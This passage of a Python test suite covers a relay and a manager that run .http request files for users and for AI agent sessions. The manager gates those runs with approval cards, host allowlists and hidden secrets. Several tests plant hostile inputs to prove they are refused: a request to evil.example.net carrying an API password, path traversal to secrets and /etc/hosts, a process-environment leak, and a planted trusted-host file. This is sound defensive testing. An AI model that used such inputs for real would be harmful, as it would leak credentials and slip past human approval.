        for path in ("/png", "/hal", "/none", "/spoof"):
            req = urllib.request.Request("http://127.0.0.1:%d%s" % (relay.port, path), headers={"Connection": "keep-alive"})
            with urllib.request.urlopen(req, timeout=10) as r:
                got[path] = (r.headers.get("Content-Type"), r.headers.get(hc.RELAY_CT), r.read())
        self.assertEqual(got["/png"], ("text/plain", "image/png", png))
        self.assertEqual(got["/hal"], ("application/hal+json", None, b'{"a":1}'))   # a text type stays
        self.assertEqual(got["/none"], (None, None, b'{"a":1}'))                     # no type: as it is
        self.assertEqual(got["/spoof"][:2], ("text/plain", None))
        self.assertEqual(seen, ["close"] * 4)   # one response per relayed connection

    def test_a_relayed_connection_ends_with_its_response(self):
        # ijhttp 2026.1 opens a connection per request and keeps the old ones open: each held a `docker exec`
        # until the run ended, and piperd (launchd: 256 files) ran out ~70 requests in - Connection reset
        import socket
        import sys
        import time
        port = self.server()   # HTTP/1.0 server: answers, then closes its side
        relay = hc.SandboxRelay([sys.executable, "-c", hc.RELAY_SCRIPT, "127.0.0.1", str(port)])
        self.addCleanup(relay.close)
        for _ in range(3):
            c = socket.create_connection(("127.0.0.1", relay.port), timeout=10)
            self.addCleanup(c.close)
            c.sendall(b"GET /a HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n")
            data = b""
            while True:   # the client never closes: the relay must end the connection itself
                b = c.recv(65536)
                if not b:
                    break
                data += b
            head = data.split(b"\r\n\r\n")[0].lower()
            self.assertIn(b"\r\nconnection: close", head)
            self.assertEqual(head.count(b"connection:"), 1)
            self.assertTrue(data.endswith(b"hello /a"), data)
        deadline = time.time() + 10
        while any(p.poll() is None or not p.stdin.closed for p in relay.procs) and time.time() < deadline:
            time.sleep(0.05)
        self.assertEqual([p.poll() is None for p in relay.procs], [False] * 3)   # no exec left per request
        self.assertTrue(all(p.stdin.closed for p in relay.procs))   # no upload thread left blocked in recv()

    def test_relay_head_filter(self):
        def run(response, chunks, rewrite=None):
            f = hc.RelayHeadFilter(rewrite or (lambda h: b"<" + h + b">"), response)
            return b"".join(f.feed(c) for c in chunks) + f.flush()
        head = b"HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n"
        # split anywhere, 1xx heads pass first, only the first final head is rewritten, the body raw
        data = b"HTTP/1.1 100 Continue\r\n\r\n" + head + b"\x89PNG\r\n\r\nHTTP/1.1 200 OK\r\n\r\n"
        want = b"HTTP/1.1 100 Continue\r\n\r\n<" + head + b">\x89PNG\r\n\r\nHTTP/1.1 200 OK\r\n\r\n"
        self.assertEqual(run(True, [data[i:i + 3] for i in range(0, len(data), 3)]), want)
        for raw in (b"SSH-2.0-x\r\n\r\nmore", b"HTTP/1.1 101 Switching\r\n\r\nws", b"\x16\x03\x01tls",
                    b"HTTP/1.1 200 OK\r\nX: " + b"a" * (hc.RELAY_HEAD_MAX + 10)):
            self.assertEqual(run(True, [raw[:5], raw[5:]]), raw, raw[:20])   # untouched from the first doubt on
        self.assertEqual(run(False, [b"GET /a HTTP/1.1\r\nHost: x\r\n\r\nbody"]), b"<GET /a HTTP/1.1\r\nHost: x\r\n\r\n>body")
        self.assertEqual(run(False, [b"\x16\x03\x01 tls hello\r\n\r\n"]), b"\x16\x03\x01 tls hello\r\n\r\n")
        # a TLS handshake (https://localhost) holds no blank line: it passes at once, in both directions - not
        # buffered until a head that never comes (the run hung until ijhttp's timeout)
        for response in (False, True):
            f = hc.RelayHeadFilter(lambda h: b"<" + h + b">", response)
            self.assertEqual(f.feed(b"\x16\x03\x01\x00\xa5\x01\x00"), b"\x16\x03\x01\x00\xa5\x01\x00")
        # a start line split after a byte or two is still one head
        self.assertEqual(run(False, [b"G", b"ET / HTTP/1.1\r\n\r\n"]), b"<GET / HTTP/1.1\r\n\r\n>")
        self.assertEqual(run(True, [b"HT", b"TP/1.1 200 OK\r\n\r\nx"]), b"<HTTP/1.1 200 OK\r\n\r\n>x")
        self.assertEqual(hc.relay_request_head(b"GET / HTTP/1.1\r\nHost: x\r\nconnection: keep-alive\r\n\r\n"),
                         b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        big = b"HTTP/1.1 200 OK\r\nContent-Type: application/pdf\r\nContent-Length: %d\r\n\r\n" % (hc.RELAY_TEXT_MAX + 1)
        # a huge body keeps its type (today's stopped run, not 8 MB of console); every head closes the connection
        self.assertEqual(hc.relay_response_head(big), big[:-2] + b"Connection: close\r\n\r\n")
        self.assertIn(b"Content-Type: text/plain\r\n", hc.relay_response_head(big.replace(b"%d" % (hc.RELAY_TEXT_MAX + 1), b"9")))

    def test_unrelay_binary(self):
        r = {"headers": [["Content-Type", "text/plain"], ["Content-Length", "1232"], [hc.RELAY_CT, "image/png"]],
             "body": "\ufffdPNG"}
        hc.unrelay_binary(r)
        self.assertEqual(r, {"headers": [["Content-Type", "image/png"], ["Content-Length", "1232"]], "body": "",
                             "binary": True, "body_size": 1232})
        plain = {"headers": [["Content-Type", "text/plain"]], "body": "hi"}
        hc.unrelay_binary(plain)
        self.assertEqual(plain, {"headers": [["Content-Type", "text/plain"]], "body": "hi"})

    def test_ports_rewrite_maps_several_ports_in_one_pass(self):
        # a new port equal to another old one is not rewritten a second time
        self.assertEqual(hc.ports_rewrite("http://localhost:1/a 127.0.0.1:2 localhost:20", {1: 2, 2: 3}),
                         "http://localhost:2/a 127.0.0.1:3 localhost:20")
        self.assertEqual(hc.rewrite_env({"t": {"a": "localhost:1", "b": "localhost:2"}}, "t", {1: 2, 2: 1}),
                         {"t": {"a": "localhost:2", "b": "localhost:1"}})


class FeedCardTest(unittest.TestCase):
    def test_a_prod_or_foreign_host_card_is_labelled_and_marked_dangerous(self):
        import feed
        pend = [{"id": "p1", "kind": "http_prod", "session": "", "title": "s", "summary": "x", "created": 1},
                {"id": "p2", "kind": "http_test", "session": "", "title": "s", "summary": "x", "created": 1}]
        acts = {a["key"]: a for a in feed.derive_actions([], pend, [], {}, {}, 10, 60)}
        self.assertIn("PRODUCTION", acts["p:p1"]["title"])
        self.assertEqual(acts["p:p1"]["actions"][0]["args"].get("danger"), "http_prod")
        self.assertNotIn("danger", acts["p:p2"]["actions"][0]["args"])


class ManagerHttpTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.m = _env.manager(cls)
        cls.root = _env.make_project("httpx", {
            "http-client/api.http": FILE, "http-client/body.json": '{"u": 1}', "http-client/check.js": "//",
            "http-client/http-client.env.json": json.dumps(ENV),
            "http-client/http-client.private.env.json": json.dumps(PRIVATE),
            "config/secrets/db.properties": "db.password=x\n", "src/A.java": "class A {}\n"})
        git(cls.root, "init", "-q")
        git(cls.root, "add", "http-client/api.http", "http-client/body.json", "http-client/check.js", "src")
        git(cls.root, "commit", "-qm", "init")
        cls.key = "team-x/httpx"
        _env.register(cls.key, cls.root)
        cls.spec = os.path.join(_env.ROOT, "fake-ijhttp.json")
        cls.log = os.path.join(_env.ROOT, "fake-ijhttp.log")
        os.environ.update({"PIPER_IJHTTP": os.path.join(HERE, "fake-ijhttp.py"), "FAKE_IJHTTP": cls.spec,
                           "FAKE_IJHTTP_LOG": cls.log})

    @classmethod
    def tearDownClass(cls):
        for k in ("PIPER_IJHTTP", "FAKE_IJHTTP", "FAKE_IJHTTP_LOG"):
            os.environ.pop(k, None)

    def setUp(self):
        with open(self.spec, "w") as f:
            json.dump({"rc": 1, "console": CONSOLE, "xml": XML}, f)
        if os.path.exists(self.log):
            os.unlink(self.log)
        for f in (hc.GLOBALS_FILE, hc.HOSTS_FILE):
            if os.path.exists(f):
                os.unlink(f)
        self.asked = []
        self.answer = True
        self.always = False

        def ask(kind, s, summary, payload, timeout=840, always="", result=None):
            self.asked.append((kind, summary, always))
            if result is not None:
                result["always"] = self.always
            return self.answer or self.always
        self.m.ask = ask
        self.m._http_session_ok.clear()

    def runs(self):
        with open(self.log) as f:
            return [json.loads(ln) for ln in f]

    def session(self):
        import sessions
        s = sessions.Session(kind="project", project=self.key, path=self.root, state="ready",
                             excludes=["http-client/http-client.env.json"])
        self.m.sessions[s.id] = s
        self.addCleanup(self.m.sessions.pop, s.id, None)
        return s

    def write(self, rel, text):
        os.makedirs(os.path.dirname(os.path.join(self.root, rel)), exist_ok=True)
        with open(os.path.join(self.root, rel), "w") as f:
            f.write(text)

    def test_env_editor_multiple_directories_and_private(self):
        rel = "other/http-client.private.env.json"
        self.write(rel, '{"qa":{"token":"old-private"}}')
        self.addCleanup(lambda: os.remove(os.path.join(self.root, rel)))
        info = self.m.http_gui_envcfg(self.key, "http-client/api.http")
        self.assertIn(rel, [f["path"] for f in info["env_files"]])
        before = self.m.http_gui_envfile(self.key, rel)
        self.m.http_gui_envfile_save(self.key, rel, '{"qa":{"token":"new-private"}}', before["sha"])
        self.assertEqual(json.loads(self.m.http_gui_envfile(self.key, rel)["text"])["qa"]["token"], "new-private")
        with self.assertRaisesRegex(hc.HttpError, "changed"):
            self.m.http_gui_envfile_save(self.key, rel, '{}', before["sha"])
        with self.assertRaisesRegex(hc.HttpError, "invalid"):
            self.m.http_gui_envfile_save(self.key, rel, '{bad', before["sha"])

    def test_env_set_blind_upsert_decline_and_conflict(self):
        from unittest.mock import patch
        rel = "http-client/http-client.env.json"
        original = common.safe_read(self.root, rel, hc.MAX_FILE)
        self.addCleanup(self.write, rel, original.decode())
        session = self.session()
        args = {"file": rel, "env": "dev", "values": {"new": "new-value", "user": "replacement"}}
        self.answer = False
        with self.assertRaisesRegex(hc.HttpError, "not approved"):
            self.m.http_tool(session, "http_env_set", args)
        self.assertEqual(common.safe_read(self.root, rel, hc.MAX_FILE), original)
        self.answer = True
        with patch.object(self.m, "_hidden_write_guard"), patch.object(self.m, "_ops_pin", return_value=None):
            result = self.m.http_tool(session, "http_env_set", args)
        self.assertEqual(result, {"ok": True})
        self.assertNotIn("pubsecret1", str(self.asked))
        after = json.loads(common.safe_read(self.root, rel, hc.MAX_FILE))
        self.assertEqual(after["dev"]["new"], "new-value")
        self.assertEqual(after["dev"]["user"], "replacement")
        self.assertEqual(after["prod"], json.loads(original)["prod"])
        def concurrent(*a, **kw):
            self.write(rel, '{"dev":{"other":"concurrent"}}')
            return True
        with patch.object(self.m, "ask", side_effect=concurrent):
            with self.assertRaisesRegex(hc.HttpError, "changed"):
                self.m.http_tool(session, "http_env_set", args)
        self.assertEqual(json.loads(common.safe_read(self.root, rel, hc.MAX_FILE)), {"dev": {"other": "concurrent"}})

    def test_env_file_path_and_structure_validation(self):
        for rel in ("../http-client.env.json", "/http-client.env.json", ".git/http-client.env.json", "other.json"):
            with self.subTest(rel=rel), self.assertRaises(hc.HttpError):
                self.m.http_gui_envfile(self.key, rel)
        for text in ('[]', '{"dev":42}', '{bad', '{"dev":{"n":NaN}}'):
            with self.subTest(text=text), self.assertRaises(hc.HttpError):
                self.m.http_gui_envfile_save(self.key, "http-client/http-client.env.json", text, "")

    # ---------------------------------------------------------------- GUI
    def test_gui_envs_lists_classes_variables_and_requests(self):
        r = self.m.http_gui_envs(self.key, "http-client/api.http")
        self.assertEqual(r["env_dir"], "http-client")
        self.assertEqual(r["envs"], [{"name": "dev", "cls": "dev"}, {"name": "test", "cls": "test"},
                                     {"name": "prod", "cls": "prod"}])
        self.assertIn("apiPassword", r["variables"]["prod"])
        self.assertNotIn("prodpass9", json.dumps(r))                 # names, never values
        self.assertEqual([q["name"] for q in r["requests"]], ["Login", "Detail", "Upload"])
        self.assertTrue(r["ijhttp"].endswith("fake-ijhttp.py"))
        self.assertEqual(r["urls"]["prod"][0], "https://api.example.org/api/login")   # resolved for the GUI
        self.assertNotIn("urls", self.m.tool(self.session(), "http_envs", {"file": "http-client/api.http"}))

    def test_gui_run_whole_file(self):
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        argv = self.runs()[0]["argv"]
        self.assertEqual(argv[argv.index("-e") + 1], "dev")
        real = os.path.realpath(self.root)
        self.assertIn(os.path.join(real, "http-client", "http-client.env.json"), argv)
        self.assertIn(os.path.join(real, "http-client", "http-client.private.env.json"), argv)
        self.assertIn("--insecure", argv)                            # dev only (policy http.insecure)
        self.assertEqual((rec["summary"], rec["ok"], rec["by"], rec["cls"]), ("2 requests, 1 failed", False, "gui", "dev"))
        self.assertEqual(rec["requests"][0]["headers"][1][0], "set-cookie")   # the user sees everything
        self.assertNotIn("agent", rec)
        sent = self.runs()[0]
        self.assertIn(hc.CAPTURE, sent["text"])                      # globals captured
        self.assertNotIn("./body.json", sent["text"])                # references point at the snapshot
        self.assertIn('{"u": 1}', sent["refs"].values())
        self.assertEqual(self.m.http_runs(self.key, "http-client/api.http")[0]["id"], rec["id"])
        self.assertEqual(self.m.http_run_record(rec["id"])["requests"][0]["status"], 200)
        self.assertEqual(common.read_json(hc.GLOBALS_FILE, {}), {"\0".join((self.key, "http-client/api.http", "dev")):
                                                                {"sessionId": "S-1"}})

    def test_cookie_directive_after_script_reaches_ijhttp_before_it_without_editing_source(self):
        text = ('### Cookie\n< {% const note = "synthetic"; %}\n# @no-cookie-jar\n'
                'GET https://api.example.com/cookie\nCookie: manual=synthetic\n')
        rel = "http-client/cookies.http"
        self.write(rel, text)
        for index in (None, 0):
            with self.subTest(index=index):
                self.m.http_gui_run(self.key, rel, "dev", index)
                sent = self.runs()[-1]["text"]
                self.assertLess(sent.index("# @no-cookie-jar"), sent.index("< {%"))
                self.assertIn("Cookie: manual=synthetic", sent)
                with open(os.path.join(self.root, rel)) as f:
                    self.assertEqual(f.read(), text)

    def test_gui_single_request_gets_the_globals_of_the_last_run(self):
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1)
        argv, text = self.runs()[1]["argv"], self.runs()[1]["text"]
        self.assertIn("sessionId=S-1", argv)
        self.assertEqual([r["name"] for r in hc.parse(text)["requests"]], ["Detail"])
        self.assertNotIn("--insecure", self.m.http_gui_run(self.key, "http-client/api.http", "test", None) and
                         self.runs()[2]["argv"])

    def test_gui_files_lists_every_http_file_with_its_last_run(self):
        os.makedirs(os.path.join(self.root, "node_modules/x"), exist_ok=True)
        self.write("node_modules/x/skip.http", "GET https://a.example/\n")
        self.write("config/secrets/hidden.http", "GET https://a.example/\n")
        self.write("docs/notes.rest", "### n\nGET https://a.example/n\n")
        for f in ("node_modules/x/skip.http", "config/secrets/hidden.http", "docs/notes.rest"):
            self.addCleanup(os.unlink, os.path.join(self.root, f))
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        r = self.m.http_gui_files(self.key)
        by = {f["file"]: f for f in r["files"]}
        self.assertIn("http-client/api.http", by)
        self.assertIn("docs/notes.rest", by)
        self.assertNotIn("node_modules/x/skip.http", by)
        # hidden from Claude: the GUI's anyway (2026-10-07), marked
        self.assertTrue(by["config/secrets/hidden.http"]["hidden"])
        self.assertFalse(by["docs/notes.rest"]["hidden"])
        self.assertEqual([q["name"] for q in by["http-client/api.http"]["requests"]], ["Login", "Detail", "Upload"])
        self.assertEqual(by["http-client/api.http"]["last"]["id"], rec["id"])
        self.assertIsNone(by["docs/notes.rest"]["last"])
        self.assertFalse(r["truncated"])

    def test_gui_errors(self):
        with self.assertRaisesRegex(hc.HttpError, "unknown environment 'nope'"):
            self.m.http_gui_run(self.key, "http-client/api.http", "nope", None)
        with self.assertRaisesRegex(hc.HttpError, "not a .http file"):
            self.m.http_gui_run(self.key, "src/A.java", "dev", None)
        with self.assertRaisesRegex(hc.HttpError, "no request #9"):
            self.m.http_gui_run(self.key, "http-client/api.http", "dev", 9)
        with self.assertRaisesRegex(hc.HttpError, "inside the project"):
            self.m.http_gui_run(self.key, "../x.http", "dev", None)
        with self.assertRaises(KeyError):
            self.m.http_run_record("../../etc")

    # ---------------------------------------------------------------- session tools
    def test_tool_runs_inline_text_for_a_file_that_does_not_exist(self):
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])
        self.always = True
        with open(os.path.join(self.root, "http-client/api.http")) as f:
            text = f.read()
        r = self.m.tool(s, "http_run", {"file": "http-client/scratch-only.http", "env": "dev", "text": text})
        self.assertEqual(r["requests"][0]["status"], 200)
        self.assertFalse(os.path.exists(os.path.join(self.root, "http-client/scratch-only.http")))
        with self.assertRaises(Exception):
            self.m.tool(s, "http_run", {"file": "http-client/x.http", "env": "dev", "text": " "})

    def test_tool_dev_scripts_over_a_hidden_env_ask_once_per_content(self):
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])   # the literal host of the Upload request
        self.always = True
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        self.assertEqual([a[0] for a in self.asked], ["http_dev"])       # scripts could read the hidden values
        self.assertIn("they can read the hidden environment values", self.asked[0][1])
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        self.assertEqual(len(self.asked), 1)                               # same content: remembered
        self.write("http-client/body.json", '{"u": 3}')                    # a reference changed: asked again
        self.addCleanup(self.write, "http-client/body.json", '{"u": 1}')
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        self.assertEqual(len(self.asked), 2)
        dump = json.dumps(r)
        self.assertNotIn("hunter22", dump)
        self.assertNotIn(base64.b64encode(b"demo:hunter22").decode(), dump)
        self.assertNotIn("sid=abc", dump)
        self.assertNotIn("S-1", json.dumps(r["requests"][0]["headers"]))
        self.assertEqual(r["requests"][0]["status"], 200)
        self.assertIn('"sessionId":"S-1"', r["requests"][0]["body"])
        self.assertEqual(r["by"], "session")

    def test_tool_prod_asks_every_time_and_withholds_bodies(self):
        import sessions
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])   # the literal host of the Upload request
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "prod", "reason": "verify fix"})
        self.assertEqual([a[0] for a in self.asked], ["http_prod"])
        self.assertIn("PROD", self.asked[0][1])
        self.assertIn("Why: verify fix", self.asked[0][1])
        self.assertIn("1. POST https://api.example.org/api/login", self.asked[0][1])
        self.assertEqual(self.asked[0][1].split("\n")[1], "⚠ 2 of them change data (POST)")   # Login + Upload; the queue shows it as a chip
        self.assertNotIn("prodpass9", self.asked[0][1])
        self.assertNotIn("body", r["requests"][0])
        self.assertIn("withheld", r["bodies"])
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "prod", "include_body": True})
        self.assertEqual(len(self.asked), 2)
        self.assertIn("Response bodies to the agent: YES", self.asked[1][1])
        self.assertIn("body", self.m.tool(s, "http_last_result", {"file": "http-client/api.http"})["requests"][0])
        self.assertIn("http_prod", sessions.ALWAYS_ASK)

    def test_an_unanswered_card_is_not_reported_as_declined(self):
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])

        def ask(kind, sess, summary, payload, timeout=840, always="", result=None):
            if result is not None:
                result.update(always=False, answered=False)
            return False
        self.m.ask = ask
        with self.assertRaisesRegex(hc.HttpError, "nobody answered the approval card"):
            self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "test"})

    def test_a_session_run_does_not_wait_long_for_another_run_of_the_project(self):
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])
        self.always = True
        lock = self.m._http_lock(self.key)
        lock.acquire()
        self.addCleanup(lock.release)
        old = hc.LOCK_WAIT_AGENT
        hc.LOCK_WAIT_AGENT = 0.2
        self.addCleanup(setattr, hc, "LOCK_WAIT_AGENT", old)
        with self.assertRaisesRegex(hc.HttpError, "another .http run of this project is in progress"):
            self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "test"})

    def test_tool_test_allow_for_this_session(self):
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])   # the literal host of the Upload request
        self.always = True
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "test"})
        self.assertEqual(self.asked[0][2], "Allow this content for the session")
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "test"})
        self.assertEqual(len(self.asked), 1)
        self.always, self.answer = False, False
        with self.assertRaisesRegex(hc.HttpError, "declined"):
            self.m.tool(self.session(), "http_run", {"file": "http-client/api.http", "env": "test"})

    def test_a_host_outside_the_environment_needs_a_card_never_auto(self):
        import sessions
        s = self.session()
        self.write("http-client/new.http", "### x\nGET https://evil.example.net/?p={{apiPassword}}\n")
        self.addCleanup(os.unlink, os.path.join(self.root, "http-client/new.http"))
        self.answer = False
        with self.assertRaisesRegex(hc.HttpError, "declined host\\(s\\) evil.example.net"):
            self.m.tool(s, "http_run", {"file": "http-client/new.http", "env": "dev"})
        self.assertEqual(self.asked[0][0], "http_host")
        self.assertIn("GET https://evil.example.net/?p=", self.asked[0][1])
        self.assertIn("http_host", sessions.ALWAYS_ASK)
        self.assertFalse(os.path.exists(self.log))                    # nothing ran
        self.write("http-client/new.http", "### x\nGET {{nextHop}}/x\n")
        with self.assertRaisesRegex(hc.HttpError, "not known before the run"):
            self.m.tool(s, "http_run", {"file": "http-client/new.http", "env": "dev"})
        self.write("http-client/new.http", "### x\nGET {{acme.domain}}/x?h={{$processEnv HOME}}\n")
        with self.assertRaisesRegex(hc.HttpError, "processEnv"):
            self.m.tool(s, "http_run", {"file": "http-client/new.http", "env": "dev"})
        self.asked.clear()
        self.write("http-client/new.http", "### x\nGET {{acme.domain}}/x\n")
        self.m.tool(s, "http_run", {"file": "http-client/new.http", "env": "dev"})   # an environment host: no card
        self.assertEqual(self.asked, [])

    def test_security_dev_switch_requires_a_card_for_plain_request(self):
        s = self.session()
        self.write("http-client/security.http", "GET {{acme.domain}}/x\n")
        self.addCleanup(os.unlink, os.path.join(self.root, "http-client/security.http"))
        old_policy = self.m.policy
        self.m.policy = dict(old_policy, ask=["http_dev"])
        self.addCleanup(setattr, self.m, "policy", old_policy)
        self.answer = False
        with self.assertRaises(hc.HttpError):
            self.m.tool(s, "http_run", {"file": "http-client/security.http", "env": "dev"})
        self.assertEqual([a[0] for a in self.asked], ["http_dev"])
        self.assertFalse(os.path.exists(self.log))

    def test_security_foreign_host_cannot_bypass_selected_environment_card(self):
        s = self.session()
        self.write("http-client/security-foreign.http", "GET https://outside.example/x\n")
        self.addCleanup(os.unlink, os.path.join(self.root, "http-client/security-foreign.http"))
        old_policy = self.m.policy
        self.m.policy = dict(old_policy, ask=["http_prod"])
        self.addCleanup(setattr, self.m, "policy", old_policy)
        self.answer = False
        with self.assertRaises(hc.HttpError):
            self.m.tool(s, "http_run", {"file": "http-client/security-foreign.http", "env": "prod"})
        self.assertEqual([a[0] for a in self.asked], ["http_prod"])
        self.assertFalse(os.path.exists(self.log))

    def test_script_free_dev_run_needs_no_card_and_masks_every_hidden_value(self):
        s = self.session()
        self.write("http-client/plain.http", "### p\nGET {{acme.domain}}/x?u={{user}}\n")
        self.addCleanup(os.unlink, os.path.join(self.root, "http-client/plain.http"))
        with open(self.spec, "w") as f:
            json.dump({"rc": 0, "console": "Request 'p' GET https://api.example.com/x?u=demo\n= request =>\n"
                       "GET https://api.example.com/x?u=demo\n\n<= response =\nHTTP/2 200 OK\n\n{\"u\":\"demo\"}\n\n"
                       "Response code: 200 (OK); Time: 5ms (5 ms)\n",
                       "xml": '<testsuites><testsuite><testcase name="Response"/></testsuite></testsuites>'}, f)
        r = self.m.tool(s, "http_run", {"file": "http-client/plain.http", "env": "dev"})
        self.assertEqual(self.asked, [])
        self.assertNotIn("demo", json.dumps(r))                  # `user` is not secret-named, but the env file is hidden
        self.assertIn("https://api.example.com", r["requests"][0]["url"])   # a plain URL stays readable

    def test_a_hidden_http_file_is_refused_for_a_session(self):
        s = self.session()
        s.excludes = ["http-client/http-client.env.json", "secret"]
        self.write("secret/admin.http", "### a\nGET {{acme.domain}}/admin?token=LITERAL123\n") if os.makedirs(
            os.path.join(self.root, "secret"), exist_ok=True) is None else None
        for tool, args in (("http_run", {"file": "secret/admin.http", "env": "dev"}),
                           ("http_envs", {"file": "secret/admin.http"}), ("http_last_result", {"file": "secret/admin.http"})):
            with self.assertRaisesRegex(hc.HttpError, "hidden by the isolation policy"):
                self.m.tool(s, tool, args)
        self.m.http_gui_run(self.key, "secret/admin.http", "dev", None)   # the user may
        try:                                                              # but a session does not see it
            self.assertNotEqual(self.m.tool(s, "http_last_result", {})["file"], "secret/admin.http")
        except hc.HttpError as e:
            self.assertIn("no run", str(e))

    def test_a_planted_env_dir_gives_no_trusted_hosts(self):
        s = self.session()
        os.makedirs(os.path.join(self.root, "sub"), exist_ok=True)
        self.write("sub/http-client.env.json", json.dumps({"dev": {"h": "http://127.0.0.1:9999"}}))
        self.write("sub/x.http", "### x\nGET {{h}}/api/state\n")
        self.answer = False
        with self.assertRaisesRegex(hc.HttpError, "declined host\\(s\\) 127.0.0.1"):
            self.m.tool(s, "http_run", {"file": "sub/x.http", "env": "dev"})
        self.assertEqual(self.asked[0][0], "http_host")

    def test_a_foreign_host_on_prod_is_one_card(self):
        s = self.session()
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "prod"})
        self.assertEqual([a[0] for a in self.asked], ["http_host"])
        self.assertIn("PROD", self.asked[0][1])
        self.assertIn("NOT in the environment: upload.example.com", self.asked[0][1])
        self.assertEqual(self.asked[0][2], "Allow these hosts for this project")

    def test_the_card_shows_referenced_scripts(self):
        s = self.session()
        self.write("http-client/h.js", "client.test(request.environment.get('apiPassword'), () => {});")
        self.write("http-client/h.http", "### h\nGET {{acme.domain}}/x\n\n> ./h.js\n")
        for f in ("h.js", "h.http"):
            self.addCleanup(os.unlink, os.path.join(self.root, "http-client", f))
        self.m.tool(s, "http_run", {"file": "http-client/h.http", "env": "test"})
        card = self.asked[0][1]
        self.assertIn("Script ./h.js:", card)
        self.assertIn("request.environment.get('apiPassword')", card)
        self.assertIn("a script reads environment values", card)

    def test_refused_file_forms_for_a_session(self):
        s = self.session()
        self.addCleanup(lambda: [os.unlink(os.path.join(self.root, "http-client", f)) for f in ("f.http", "b.txt")
                                 if os.path.exists(os.path.join(self.root, "http-client", f))])
        self.write("http-client/b.txt", "h={{$processEnv HOME}}")
        self.write("http-client/f.http", "### f\nPOST {{acme.domain}}/x\n\n<@ ./b.txt\n")
        with self.assertRaisesRegex(hc.HttpError, "b.txt: \\{\\{\\$dotenv"):
            self.m.tool(s, "http_run", {"file": "http-client/f.http", "env": "dev"})
        self.write("http-client/f.http", "### f\nPOST {{acme.domain}}/x\n\n<@ ../config/secrets/db.properties\n")
        with self.assertRaisesRegex(hc.HttpError, "hidden by the isolation policy"):
            self.m.tool(s, "http_run", {"file": "http-client/f.http", "env": "dev"})
        self.write("http-client/f.http", "### f\nGET {{acme.domain}}/x\n\n>> /tmp/out.json\n")
        with self.assertRaisesRegex(hc.HttpError, "saving the response"):
            self.m.tool(s, "http_run", {"file": "http-client/f.http", "env": "dev"})
        with self.assertRaisesRegex(hc.HttpError, "ijhttp CLI hangs"):
            self.m.http_gui_run(self.key, "http-client/f.http", "dev", None)
        with self.assertRaisesRegex(hc.HttpError, "index must be an integer"):
            self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": True})
        p = hc.parse("### p\n< ./pre.js\nGET https://a.example/\n")["requests"][0]
        self.assertEqual((p["files"], p["scripts"]), (["./pre.js"], ["./pre.js"]))

    def test_gui_run_refuses_a_file_changed_since_it_was_shown(self):
        sha = self.m.http_gui_envs(self.key, "http-client/api.http")["sha"]
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None, sha)
        with self.assertRaisesRegex(hc.HttpError, "changed since you opened it"):
            self.m.http_gui_run(self.key, "http-client/api.http", "dev", None, "0" * 64)

    def test_committing_the_file_in_the_sandbox_does_not_make_its_hosts_trusted(self):
        s = self.session()
        self.write("http-client/evil.http", "### x\nGET https://evil.example.net/\n")
        git(self.root, "add", "http-client/evil.http")
        git(self.root, "commit", "-qm", "evil")                       # git is open in the sandbox
        self.answer = False
        with self.assertRaisesRegex(hc.HttpError, "declined host"):
            self.m.tool(s, "http_run", {"file": "http-client/evil.http", "env": "dev"})

    def test_allow_for_this_project_remembers_the_hosts(self):
        s = self.session()
        self.always = True                                            # upload.example.com: a literal host of the file
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        self.assertEqual([a[0] for a in self.asked], ["http_host"])   # ONE card (its scripts are on it too)
        self.assertEqual(self.asked[0][2], "Allow these hosts for this project")
        self.assertIn("upload.example.com", common.read_json(hc.HOSTS_FILE, {})[self.key])
        self.asked.clear()
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        self.assertEqual([a[0] for a in self.asked], ["http_dev"])    # hosts remembered; the scripts still ask once
        self.asked.clear()
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        self.assertEqual(self.asked, [])
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1})   # one request: its host only

    def test_hidden_or_outside_references_are_refused_for_a_session(self):
        s = self.session()
        self.write("http-client/leak.http", "### x\nPOST {{acme.domain}}/x\n\n< ../config/secrets/db.properties\n")
        self.addCleanup(os.unlink, os.path.join(self.root, "http-client/leak.http"))
        with self.assertRaisesRegex(hc.HttpError, "hidden by the isolation policy"):
            self.m.tool(s, "http_run", {"file": "http-client/leak.http", "env": "dev"})
        self.write("http-client/leak.http", "### x\nPOST {{acme.domain}}/x\n\n< ../../../etc/hosts\n")
        with self.assertRaisesRegex(hc.HttpError, "inside the project"):
            self.m.tool(s, "http_run", {"file": "http-client/leak.http", "env": "dev"})

    def test_http_envs_tool_and_last_result_of_a_gui_run(self):
        s = self.session()
        r = self.m.tool(s, "http_envs", {})
        self.assertEqual(r["env_dirs"][0]["env_dir"], "http-client")
        self.assertNotIn("hunter22", json.dumps(r))
        with self.assertRaisesRegex(hc.HttpError, "no run"):
            self.m.tool(s, "http_last_result", {"file": "http-client/none.http"})
